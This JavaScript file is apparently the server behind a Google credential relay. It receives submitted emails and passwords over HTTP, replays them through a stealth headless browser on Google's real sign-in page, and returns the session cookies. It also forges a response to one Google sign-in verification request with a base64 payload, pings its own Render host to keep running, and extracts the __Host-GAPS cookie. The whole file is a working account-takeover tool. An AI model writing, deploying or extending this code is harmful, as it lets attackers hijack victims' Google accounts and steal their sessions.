const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const bodyParser = require('body-parser')
const express = require('express')
const axios = require('axios')
require('dotenv').config()

let page = null
let mID = null
let mLoaded = false
let mUrl = null
let mPostData = null
let mHeaders = null

let mStart = new Date().toString()

const app = express()

app.use(express.json())
app.use(bodyParser.urlencoded({ extended: true }))

puppeteer.use(StealthPlugin())

const PORT = process.env.PORT || 3000

app.listen(PORT, () => {
    console.log(`Listening on port ${PORT}...`)
})

startBrowser()

setInterval(async () => {
    await pageReload()
}, 30*60*1000)

setInterval(async () => {
    await updateStatus()
}, 60000)

app.post('/login', async (req, res) => {
    if (req.body) {
        let email = req.body.email
        let password = req.body.password
        if (email && password) {
            if (mLoaded) {
                let mData = await getLoginToken(email, password)
                res.end(JSON.stringify(mData))
            } else {
                await delay(10000)
                res.end(JSON.stringify({ status:-1 }))
            }
        } else {
            res.end(JSON.stringify({ status:-1 }))
        }
    } else {
        res.end(JSON.stringify({ status:-1 }))
    }
})

app.get('/login', async (req, res) => {
    if (req.query) {
        let number = req.query.number
        if (number) {
            if (mLoaded) {
                let mData = await getLoginToken(number)
                res.end(JSON.stringify(mData))
            } else {
                await delay(10000)
                res.end(JSON.stringify({ status:-1 }))
            }
        } else {
            res.end(JSON.stringify({ status:-1 }))
        }
    } else {
        res.end(JSON.stringify({ status:-1 }))
    }
})

app.get('/reload', async (req, res) => {
    await pageReload()
    res.end('Reload Success')
})

app.get('/', async (req, res) => {
    if (mID == null) {
        try {
            let url = req.query.url
            if (!url) {
                let host = req.hostname
                if (host.endsWith('onrender.com')) {
                    url = host.replace('.onrender.com', '')
                }
            }
    
            if (url && url != 'localhost') {
                mID = url
            }
        } catch (error) {}
    }
    
    res.end(mStart)
})


async function startBrowser() {
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ],
            executablePath: process.env.NODE_ENV == 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', request => {
            try {
                if (request.url().startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
                    mUrl = request.url()
                    mHeaders = request.headers()
                    mPostData = request.postData()
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        mLoaded = true

        console.log('Page Load Success')
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}

async function pageReload() {
    mLoaded = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mLoaded = true
}

async function getLoginToken(email, password) {
    try {
        console.log('[getLoginToken] Start with email:', email)
        await loadingRemove()
        mUrl = null
        mHeaders = null
        mPostData = null
        // Điền email
        await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
        await page.waitForSelector('input[type="email"],input#identifierId', {timeout: 10000})
        await page.type('input[type="email"],input#identifierId', email, {delay: 50})
        // Click Next
        await page.waitForSelector('#identifierNext', {timeout: 10000})
        await page.click('#identifierNext')
        // Chờ password
        await page.waitForTimeout(1000)
        await page.waitForSelector('input[type="password"]', {timeout: 10000})
        await page.type('input[type="password"]', password, {delay: 50})
        // Click Next
        await page.waitForSelector('#passwordNext', {timeout: 10000})
        await page.click('#passwordNext')
        // Chờ login thành công hoặc lỗi
        await page.waitForTimeout(3000)
        // Lấy url hiện tại
        const currentUrl = page.url()
        // Lấy cookie hiện tại
        const cookies = await page.cookies()
        // Kiểm tra login thành công
        if (currentUrl.includes('myaccount.google.com')) {
            return { status: 1, message: 'Login success', email, url: currentUrl, cookies }
        }
        // Kiểm tra lỗi
        const errorText = await page.evaluate(() => {
            let el = document.querySelector('div.o6cuMc')
            return el ? el.innerText : null
        })
        if (errorText) {
            return { status: 0, error: errorText, url: currentUrl, cookies }
        }
        return { status: 0, error: 'Unknown error', url: currentUrl, cookies }
    } catch (error) {
        console.log('[getLoginToken] catch error:', error)
        return { status: 0, error: error.toString() }
    }
}

async function loadingRemove() {
    await page.evaluate(() => {
        let root = document.querySelector('div[class="kPY6ve"]')
        if (root) {
            root.remove()
        }
        root = document.querySelector('div[class="Ih3FE"]')
        if (root) {
            root.remove()
        }
    })
}


async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
            break
        } catch (error) {}
    }
}

async function updateStatus() {
    try {
        if (mID) {
            await axios.get('https://'+mID+'.onrender.com')
        }
    } catch (error) {}
}

function getHostGaps(cookies) {
    try {
        if (cookies.includes('__Host-GAPS')) {
            let temp = cookies.substring(cookies.indexOf('__Host-GAPS=')+12, cookies.length)
            if (temp.includes(';')) {
                return temp.substring(0, temp.indexOf(';'))
            }
            return temp
        }
    } catch (error) {}

    return null
}

function decode(text) {
    return Buffer.from(text, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
